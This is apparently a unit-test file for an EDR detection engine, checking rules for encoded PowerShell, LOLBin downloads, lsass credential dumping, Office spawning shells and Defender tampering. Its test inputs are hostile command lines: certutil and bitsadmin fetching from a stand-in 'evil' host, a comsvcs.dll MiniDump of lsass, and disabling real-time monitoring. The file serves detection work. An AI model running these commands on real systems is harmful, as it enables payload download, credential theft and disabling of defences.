"""Unit tests for the EDR detection engine (pure rule evaluation, no DB)."""
from __future__ import annotations

from app.services import detections


def _proc(**data):
    return {"type": "process_created", "data": data}


def _ids(event):
    return {r.id for r in detections.evaluate(event)}


def test_encoded_powershell_is_high():
    ev = _proc(name="powershell.exe", cmdline="powershell -NoP -EncodedCommand ZQBjAGgAbwAgAGgAaQ==")
    hits = detections.evaluate(ev)
    assert {r.id for r in hits} == {"encoded_powershell"}
    assert hits[0].severity == "high"


def test_lolbin_download():
    assert "lolbin_download" in _ids(_proc(name="certutil.exe", cmdline="certutil.exe -urlcache -f http://evil/x.exe x.exe"))
    assert "lolbin_download" in _ids(_proc(name="bitsadmin.exe", cmdline="bitsadmin /transfer j http://evil/x x"))


def test_credential_dumping_is_critical():
    hits = detections.evaluate(_proc(name="rundll32.exe", cmdline="rundll32 comsvcs.dll, MiniDump 640 lsass.dmp full"))
    assert {r.id for r in hits} == {"credential_dumping"}
    assert hits[0].severity == "critical"


def test_office_spawns_shell_uses_nested_parent():
    ev = _proc(name="cmd.exe", cmdline="cmd /c calc", parent={"name": "WINWORD.EXE"})
    assert "office_spawns_shell" in _ids(ev)
    # A shell with a benign parent does not match that rule.
    assert "office_spawns_shell" not in _ids(_proc(name="cmd.exe", cmdline="cmd /c calc", parent={"name": "explorer.exe"}))


def test_defender_tamper():
    assert "defender_tamper" in _ids(_proc(name="powershell.exe", cmdline="Set-MpPreference -DisableRealtimeMonitoring $true"))


def test_benign_process_matches_nothing():
    assert detections.evaluate(_proc(name="notepad.exe", cmdline="notepad.exe report.txt")) == []
    assert detections.evaluate({"type": "process_created", "data": {}}) == []


def test_unknown_event_type_is_ignored():
    assert detections.evaluate({"type": "heartbeat", "data": {"cmdline": "mimikatz"}}) == []


def test_operators():
    rules = (detections.Rule("t", "t", "low", "x", (detections.Cond("f", "icontains", "AbC"),)),)
    assert detections.evaluate({"type": "x", "data": {"f": "xxABCxx"}}, rules)
    assert not detections.evaluate({"type": "x", "data": {"f": "xyz"}}, rules)
